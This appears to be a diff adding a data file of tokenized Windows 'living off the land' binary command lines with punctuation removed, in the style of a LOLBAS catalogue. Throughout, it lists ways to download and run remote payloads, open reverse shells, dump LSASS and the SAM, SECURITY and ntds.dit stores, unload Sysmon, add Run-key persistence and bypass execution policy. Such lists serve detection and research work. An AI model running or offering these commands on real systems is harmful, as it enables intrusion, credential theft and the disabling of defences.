@@ -1,0 +1,383 @@
+explorer exe calc exe
+netsh exe trace start capture yes filemode append persistent yes tracefile IPv4 Address IPofRemoteFileShare
+netsh exe trace show status
+netsh exe add helper C dll
+netsh interface portproxy add listenport listenaddress connectport connectaddress
+nltest exe SERVER QUERY
+OpenWith exe C hta
+OpenWith exe C msi
+powershell ep Bypass c
+psr exe start gui number output c zip
+psr exe start maxsc gui number output c zip
+psr exe stop
+Robocopy exe C C
+Robocopy exe SERVER SourceFolder C DestFolder
+Replace C Program Files x86 Reader exe
+C Program Files aswrun dll C Users Public Libraries tempsys module dll
+Gpup exe w e c Windows System32 calc exe
+NLNOTES EXE authenticate N ini Command if Get ExecutionPolicy ne AllSigned Set ExecutionPolicy Scope Process Bypass
+Notes exe N ini Command if Get ExecutionPolicy ne AllSigned Set ExecutionPolicy Scope Process Bypass
+Nvudisp exe calc exe
+Nvudisp exe Copy txt txt
+Nvudisp exe SetReg HKEY_CURRENT_USER Software Microsoft Windows CurrentVersion Run malware exe
+Nvudisp exe CreateShortcut lnk c windows system32 calc exe c windows system32
+Nvudisp exe KillApp calculator exe
+Nvudisp exe Run
+nvuhda6 exe System calc exe
+nvuhda6 exe Copy test txt txt
+nvuhda6 exe SetReg HKEY_CURRENT_USER Software Microsoft Windows CurrentVersion Run malware malware exe
+nvuhda6 exe CreateShortcut lnk C Windows System32 calc exe C Windows System32
+nvuhda6 exe KillApp calc exe
+nvuhda6 exe Run
+Replace ROCCAT_Swarm_Monitor exe exe
+RunCmd_X64 file cmd F
+Run Setup exe
+Update exe processStart exe process start args
+Usbinst exe InstallHinfSection DefaultInstall number c calc inf
+VBoxDrvInst exe driver executeinf c temp calc inf
+winword exe l dllfile dll
+cscript js C xml c xls c out
+wscript js C xml c xls c out
+start ms appinstaller source https com raw tdyShwLw
+C Windows Microsoft NET Framework64 v4 number number aspnet_compiler exe v none p C users cpl internal f C users cpl internal none u
+C Windows System32 at exe at number number interactive every m t w th f s su C Windows System32 revshell exe
+ATBroker exe start
+bash exe c calc exe
+bash exe c socat tcp connect number number number number number exec sh pty stderr setsid sigint sane
+bash exe c cat zip tcp number
+bitsadmin create number bitsadmin addfile number c windows system32 cmd exe c data cmd exe bitsadmin SetNotifyCmdLine number c data number txt cmd exe NULL bitsadmin RESUME number bitsadmin complete number
+bitsadmin create number bitsadmin addfile number https com autoruns exe c data autoruns exe bitsadmin RESUME number bitsadmin complete number
+bitsadmin create number bitsadmin addfile number c windows system32 cmd exe c data cmd exe bitsadmin RESUME number bitsadmin Complete number bitsadmin reset
+bitsadmin create number bitsadmin addfile number c windows system32 cmd exe c data cmd exe bitsadmin SetNotifyCmdLine number c data playfolder cmd exe NULL bitsadmin RESUME number bitsadmin Reset
+certoc exe LoadDLL C calc dll
+certoc exe GetCACAPS https raw githubusercontent com PowerShellMafia PowerSploit master CodeExecution Invoke DllInjection ps1
+CertReq Post config https org c windows ini txt
+CertReq Post config https org c windows ini and show response in terminal
+certutil exe urlcache split f http 7-zip org 7z1604 x64 exe 7zip exe
+certutil exe verifyctl f split http 7-zip org 7z1604 x64 exe 7zip exe
+certutil exe urlcache split f https raw githubusercontent com Moriarty2016 git master ps1 c
+certutil encode
+certutil decode
+certutil decodehex
+cmd exe c echo regsvr32 exe s u i https raw githubusercontent com redcanaryco RegSvr32 sct scrobj dll doc bat
+cmd exe doc bat
+type file ext C file ext
+type C file ext webdav server file ext
+cmdkey list
+cmdl32 vpn lan
+cmstp exe ni s c CorpVPN inf
+cmstp exe ni s https raw githubusercontent com Cmstp inf
+ConfigSecurityPolicy exe C Windows System32 calc exe https webhook site
+ConfigSecurityPolicy exe https com
+conhost exe calc exe
+conhost exe headless calc exe
+control exe c windows tasks file txt dll
+csc exe out exe File cs
+csc target library File cs
+cscript e vbscript c file txt script vbs
+CustomShellHost exe
+DataSvcUtil out C Windows System32 calc exe uri https webhook site
+set SYSTEMROOT C Windows Temp cmd c desktopimgdownldr exe lockscreenurl https com number file ext eventName
+DeviceCredentialDeployment
+rundll32 exe dfshim dll ShOpenVerbApplication http com param1
+diantz exe c file exe c txt cab
+diantz exe exe c destinationFolder file cab
+diskshadow exe s c diskshadow txt
+diskshadow exec calc exe
+dnscmd exe config serverlevelplugindll number number number number dll
+esentutl exe y C folder vbs d C folder vbs o
+esentutl exe y C exe d c txt file exe o
+esentutl exe y C txt exe d c ADS file exe o
+esentutl exe y number number number number exe d c ADS txt exe o
+esentutl exe y live sysinternals com tools adrestore exe d otherwebdavserver webdav adrestore exe o
+esentutl exe y vss c windows ntds ntds dit d c ntds dit
+eventvwr exe
+ysoserial exe o raw f BinaryFormatter g c calc RecentViews copy RecentViews LOCALAPPDATA Microsoft EventV number RecentViews eventvwr exe
+expand bat c bat
+expand c bat c bat
+expand bat c txt bat
+explorer exe root C Windows System32 calc exe
+explorer exe C Windows System32 notepad exe
+Extexport exe c
+extrac32 C procexp cab c txt procexp exe
+extrac32 cab c txt exe
+extrac32 Y C txt C txt
+extrac32 exe C C Windows System32 calc exe C Desktop calc exe
+findstr V L c exe c txt exe
+findstr V exe c txt exe
+findstr S I cpassword xml
+findstr V L exe c exe
+finger more number cmd
+fltMC exe unload SysmonDrv
+forfiles p c windows system32 m notepad exe c calc exe
+forfiles p c windows system32 m notepad exe c c folder normal dll exe
+fsutil exe file setZeroData offset number length number C Windows Temp payload dll
+fsutil exe usn deletejournal d c
+echo calc exe txt ftp s txt
+cmd exe c echo open com number ftp txt echo USER ftp txt echo PASS PaSsWoRd txt echo binary ftp txt echo GET exe ftp txt echo quit txt s txt v
+Gpscript logon
+Gpscript startup
+HH exe http script ps1
+HH exe c windows system32 calc exe
+ie4uinit exe BaseSettings
+ieexec exe http number exe
+ilasm exe C txt exe
+ilasm exe C txt dll
+C Windows System32 IMEWDBLD exe https pastebin com raw tdyShwLw
+InfDefaultInstall exe Infdefaultinstall inf
+InstallUtil exe logfile LogToConsole false U dll
+InstallUtil exe https com
+jsc exe scriptfile js
+jsc exe t Library js
+Ldifde i f ldf
+makecab c autoruns exe c txt autoruns cab
+makecab webdavserver webdav file exe C Folder file txt file cab
+makecab webdavserver webdav file exe C Folder file cab
+MavInject exe number INJECTRUNNING c folder evil dll
+Mavinject exe number INJECTRUNNING c ads file txt file dll
+Microsoft Workflow Compiler exe xml xml
+Microsoft Workflow Compiler exe txt txt
+mmc exe Embedding c msc
+mmc exe gpedit msc
+MpCmdRun exe DownloadFile url https beacon exe path c beacon exe
+copy C ProgramData Microsoft Windows Defender Platform number number number number number MpCmdRun exe C Users Downloads MP exe chdir C ProgramData Microsoft Windows Defender Platform number number number number number C Users Public Downloads MP exe DownloadFile url https beacon exe path C Users Public Downloads exe
+MpCmdRun exe DownloadFile url https attacker server beacon exe path c temp nicefile txt evil exe
+msbuild exe pshell xml
+msbuild exe csproj
+msbuild exe logger C Loggers dll MyParameters
+msbuild exe project proj
+msbuild exe rsp
+Msconfig exe number
+msdt exe path C WINDOWS diagnostics index PCWDiagnostic xml af C PCW8E57 xml skip TRUE
+msdt exe id PCWDiagnostic skip force param IT_LaunchMethod ContextMenu IT_BrowseForFile calc exe
+msedge exe https com exe txt
+msedge exe headless enable logging disable gpu dump dom http com html out b64
+mshta exe hta
+mshta exe vbscript Close Execute GetObject script https sct
+mshta exe javascript a GetObject script https sct Exec close
+mshta exe C txt hta
+mshta exe https com
+msiexec quiet i cmd msi
+msiexec q i http number number number number tmp cmd png
+msiexec y C dll
+msiexec z C dll
+netsh exe add helper C dll
+odbcconf a REGSVR c dll
+odbcconf INSTALLDRIVER Driver c dll APILevel number
+odbcconf configsysdsn DSN
+odbcconf f rsp
+OfflineScannerShell
+OneDriveStandaloneUpdater
+pcalua exe a calc exe
+pcalua exe a server dll
+pcalua exe a C Windows system32 javacpl cpl c Java
+Pcwrun exe c temp beacon exe
+Pcwrun exe calc exe
+pktmon exe start etw
+pktmon exe filter add p number
+pnputil exe i a C inf
+Presentationhost exe C temp xbap
+Presentationhost exe https com
+print D C txt file exe C ADS File exe
+print D C exe C exe
+print D C exe WebDavServer exe
+PrintBrm b d number number number number f C Users zip
+PrintBrm r f C txt zip d C
+psr exe start D zip sc number gui number
+rasautou d powershell dll p powershell a e
+rdrleakdiag exe p number o c evil fullmemdmp wait number
+rdrleakdiag exe p number o c evil fullmemdmp wait number
+rdrleakdiag exe p number o c evil fullmemdmp snap
+reg export HKLM SOFTWARE Microsoft Evilreg c txt reg
+reg save HKLM SECURITY c bak reg save HKLM SYSTEM c system bak reg save HKLM SAM c bak
+regasm exe AllTheThingsx64 dll
+regasm exe U AllTheThingsx64 dll
+regedit E c ads file txt regfile reg HKEY_CURRENT_USER MyCustomRegKey
+regedit C ads file txt regfile reg
+regini exe txt ini
+Register cimprovider C dll
+regsvcs exe AllTheThingsx64 dll
+regsvr32 s n u i http com sct scrobj dll
+regsvr32 exe s u i sct scrobj dll
+replace exe C cab C A
+replace exe webdav host com foo bar exe c A
+rpcping s number number number number e number a privacy u NTLM
+rpcping s number number number number e number a connect u NTLM
+rundll32 exe AllTheThingsx64 EntryPoint
+rundll32 exe number number number number share payload dll EntryPoint
+rundll32 exe javascript mshtml RunHTMLApplication document write new 20ActiveXObject WScript Shell Run powershell nop exec bypass c IEX New Object Net WebClient DownloadString http ip port
+rundll32 exe javascript mshtml dll RunHTMLApplication eval w new 20ActiveXObject WScript Shell w run calc window close
+rundll32 exe javascript mshtml RunHTMLApplication document write h new 20ActiveXObject WScript Shell run calc exe number true try h Send b h ResponseText eval b catch e new 20ActiveXObject WScript Shell Run cmd c taskkill f im rundll32 exe number true
+rundll32 exe javascript mshtml RunHTMLApplication document write GetObject script https raw githubusercontent com 3gstudent Javascript Backdoor master test
+rundll32 C ads file txt ADSDLL dll DllMain
+rundll32 exe sta CLSID
+runexehelper exe c windows system32 calc exe
+Runonce exe AlternateShellStartup
+runscripthelper exe surfacecheck C Test Microsoft Diagnosis scripts txt C
+sc create evilservice binPath c ADS txt cmd exe c echo works c ADS works txt DisplayName evilservice start auto sc start evilservice
+sc config existing binPath c ADS txt cmd exe c echo works c ADS works txt sc start existing
+schtasks create sc minute mo number tn Reverse shell tr c revshell exe
+schtasks create s targetmachine tn MyTask tr c exe sc daily
+Scriptrunner exe appvscript calc exe
+ScriptRunner exe appvscript fileserver calc cmd
+setres exe w number h number
+SettingSyncHost LoadAndRunDiagScript anything
+SettingSyncHost LoadAndRunDiagScriptNoCab anything
+ssh localhost calc exe
+ssh o ProxyCommand calc exe
+stordiag exe
+SyncAppvPublishingServer exe n New Object Net WebClient DownloadString http some url script ps1 IEX
+TTDInject exe ClientParams number tmp run number number number number number number number number number number Launch C Windows System32 calc exe
+ttdinject exe ClientScenario TTDRecorder ddload number ClientParams number tmp run number number number number number number number number number number launch C Windows System32 calc exe
+tttracer exe C windows system32 calc exe
+TTTracer exe dumpFull attach pid
+rmdir temp lolbin s q number nul mkdir temp lolbin Windows Media Player copy C Windows System32 calc exe temp lolbin Windows Media Player wmpnscfg exe nul cmd V C set ProgramW6432 temp lolbin unregmp2 exe HideWMP
+vbc exe exe c temp vbs run vb
+vbc reference Microsoft VisualBasic dll c temp vbs run vb
+verclsid exe S C CLSID
+wab exe
+winget exe install manifest manifest yml
+wlrmdr exe s number f number t m a number u calc exe
+wmic exe process call create c ads txt program exe
+wmic exe process call create calc
+wmic exe node number number number number process call create exe
+wmic exe process get brief format https raw githubusercontent com LOLBAS xsl
+wmic exe process get brief format number number number number c Tools pocremote xsl
+WorkFolders
+wscript e vbscript c ads txt script vbs
+echo GetObject script https raw githubusercontent com sailay1996 misc bin master calc js temp test txt hi js wscript exe temp test txt hi js
+wsreset exe
+wt exe calc exe
+wuauclt exe UpdateDeploymentProvider RunHandlerComServer
+xwizard RunWizard number number number number 0000FEEDACDC
+xwizard RunWizard taero u number number number number 0000FEEDACDC
+xwizard RunWizard 7940acf8 60ba number a7c3 f3b400ee266d zhttps pastebin com raw iLxUT5gM
+C Windows System32 DriverStore FileRepository igdlh64 inf_amd64_ number number GfxDownloadWrapper exe
+rundll32 exe advpack dll LaunchINFSection c test inf DefaultInstall_SingleUser number
+rundll32 exe advpack dll LaunchINFSection c test inf number
+rundll32 exe advpack dll RegisterOCX test dll
+rundll32 exe advpack dll RegisterOCX calc exe
+rundll32 advpack dll RegisterOCX cmd exe c calc exe
+rundll32 C windows system32 comsvcs dll MiniDump LSASS_PID dump bin full
+rundll32 exe desk cpl InstallScreenSaver C temp file scr
+rundll32 exe desk cpl InstallScreenSaver number number number number c temp file scr
+rundll32 exe ieadvpack dll LaunchINFSection c test inf DefaultInstall_SingleUser number
+rundll32 exe ieadvpack dll LaunchINFSection c test inf number
+rundll32 exe ieadvpack dll RegisterOCX test dll
+rundll32 exe ieadvpack dll RegisterOCX calc exe
+rundll32 ieadvpack dll RegisterOCX cmd exe c calc exe
+rundll32 exe ieframe dll OpenURL C test calc url
+rundll32 exe Mshtml dll PrintHTML C temp calc hta
+rundll32 exe pcwutl dll LaunchApplication calc exe
+rundll32 exe setupapi dll InstallHinfSection DefaultInstall number C Tools shady inf
+rundll32 exe setupapi dll InstallHinfSection DefaultInstall number C Tools calc_exe inf
+rundll32 exe shdocvw dll OpenURL C test calc url
+rundll32 exe shell32 dll Control_RunDLL c dll
+rundll32 exe shell32 dll ShellExec_RunDLL beacon exe
+rundll32 SHELL32 DLL ShellExec_RunDLL cmd exe c echo
+rundll32 exe syssetup dll SetupInfObjectInstallAction DefaultInstall number c shady inf
+rundll32 syssetup dll SetupInfObjectInstallAction DefaultInstall number c temp inf
+rundll32 exe url dll OpenURL C test calc hta
+rundll32 exe url dll OpenURL C test calc url
+rundll32 exe url dll OpenURL file C W i n d o w s s y s t e m number number c a l c e x e
+rundll32 exe url dll FileProtocolHandler calc exe
+rundll32 exe url dll FileProtocolHandler file C W i n d o w s s y s t e m number number c a l c e x e
+rundll32 exe url dll FileProtocolHandler file C test test hta
+rundll32 exe zipfldr dll RouteTheCall calc exe
+rundll32 exe zipfldr dll RouteTheCall file C W i n d o w s s y s t e m number number c a l c e x e
+C Windows diagnostics system AERO CL_Invocation ps1 nSyncInvoke executable args
+powershell exe ep bypass command set location path C Windows diagnostics system Audio import module CL_LoadAssembly ps1 LoadAssemblyFromPath testing fun dll Program Fun
+C Windows diagnostics system AERO CL_Mutexverifiers ps1 nrunAfterCancelProcess calc ps1
+powershell ep RemoteSigned f Launch VsDevShell ps1 VsWherePath C windows system32 calc exe
+powershell ep RemoteSigned f Launch VsDevShell ps1 VsInstallationPath calc exe
+set comspec c windows system32 calc exe cscript c windows system32 manage bde wsf
+copy c users person evil exe c users public manage bde exe cd c users public cscript exe c windows system32 manage bde wsf
+Pester bat help null notepad
+Pester bat calc exe
+pubprn vbs number number number number script https domain com folder file sct
+SyncAppvPublishingServer vbs n New Object Net WebClient DownloadString http some url script ps1 IEX
+powershell exe ep bypass command set location path c windows diagnostics system networking import module UtilityFunctions ps1 RegSnapin temp unsigned dll Program Class Main
+winrm invoke Create wmicimv2 Win32_Process CommandLine notepad exe r http target number
+winrm invoke Create wmicimv2 Win32_Service Name Evil DisplayName Evil PathName cmd exe k c windows system32 notepad exe r http acmedc number winrm invoke StartService wmicimv2 Win32_Service Name Evil r http acmedc number
+SystemDrive BypassDir cscript nologo windir System32 winrm vbs get wmicimv2 Win32_Process Handle number format pretty
+AccCheckConsole exe window Untitled Notepad C path to your lolbas dll
+adplus exe hang pn lsass exe o c users mr d0x output folder quiet
+adplus exe c config adplus xml
+adplus exe crash o C temp sc calc exe
+AgentExecutor exe powershell c temp malicious ps1 c temp log c temp log c temp log number C Windows SysWOW64 WindowsPowerShell v1 number number number
+AgentExecutor exe powershell c temp malicious ps1 c temp log c temp log c temp log number C temp number number
+AppVLP exe webdav calc bat
+AppVLP exe powershell exe c e New Object ComObject shell application e ShellExecute calc exe open number
+AppVLP exe powershell exe c e New Object ComObject excel application e RegisterXLL webdav xll_poc xll
+bginfo exe bginfo bgi popup nolicprompt
+number number number number webdav bginfo exe bginfo bgi popup nolicprompt
+live sysinternals com Tools bginfo exe number number number number webdav bginfo bgi popup nolicprompt
+cdb exe cf x64_calc wds o notepad exe
+cdb exe pd pn
+shell cmd
+cdb exe c C txt calc
+coregen exe L C folder dll
+coregen exe dummy_assembly_name
+createdump exe n f dump dmp PID
+csi exe file
+DefaultPack EXE C process exe args
+devinit exe run t msi install i https example com out msi
+devtoolslauncher exe LaunchForDeploy
+devtoolslauncher exe LaunchForDebug
+dnx exe consoleapp
+dotnet exe
+dotnet exe fsi
+dotnet exe msbuild
+dump64 exe out dmp
+DumpMinitool exe file c users dump txt processId number dumpType Full
+Dxcap exe c C Windows System32 notepad exe
+Excel exe http number number number number TeamsAddinLoader dll
+fsi exe c path to fsscript
+fsi exe
+fsianycpu exe c path to fsscript
+fsianycpu exe
+Mftrace exe cmd exe
+Mftrace exe powershell exe
+Microsoft NodejsTools PressAnyKey exe normal number cmd exe
+msdeploy exe verb sync source RunCommand dest runCommand c temp calc bat
+MsoHtmEd exe https example com payload
+mspub exe https example com payload
+msxsl exe customers xml script xsl
+msxsl exe https raw githubusercontent com 3gstudent Use msxsl to bypass AppLocker master shellcode xml https raw githubusercontent com 3gstudent Use msxsl to bypass AppLocker master shellcode xml
+ntdsutil exe ac i ntds ifm create full c q q
+OpenConsole exe calc
+Powerpnt exe http number number number number TeamsAddinLoader dll
+procdump exe md calc dll explorer exe
+procdump exe md calc dll foobar
+ProtocolHandler exe https example com payload
+rcsi exe bypass csx
+Remote exe s powershell exe anythinghere
+Remote exe s number number number number binaries file exe anythinghere
+sqldumper exe number number 0x0110
+sqldumper exe number number 0x01100 number
+Sqlps exe noprofile
+SQLToolsPS exe noprofile command Start Process calc exe
+squirrel exe download url to package
+squirrel exe update url to package
+squirrel exe updateRoolback
+squirrel exe updateRollback
+te exe wsc
+Tracker exe d calc dll c C Windows exe
+Update exe download
+Update exe update
+Update exe update remoteserver payloadFolder
+Update exe updateRollback url to package
+Update exe updateRollback remoteserver payloadFolder
+Update exe createShortcut exe l Startup
+Update exe removeShortcut exe l Startup
+VisualUiaVerifyNative exe
+VSIISExeLauncher exe p a
+Vsjitdebugger exe calc exe
+vsls agent exe agentExtensionPath c dll
+wfc exe c path to xoml
+winword exe http number number number number TeamsAddinLoader dll
+wsl exe e c Windows System32 calc exe
+wsl exe u root e cat etc shadow
+wsl exe exec bash c cat
+wsl exe system calc exe
+wsl exe exec bash c cat tcp number number number number number binary
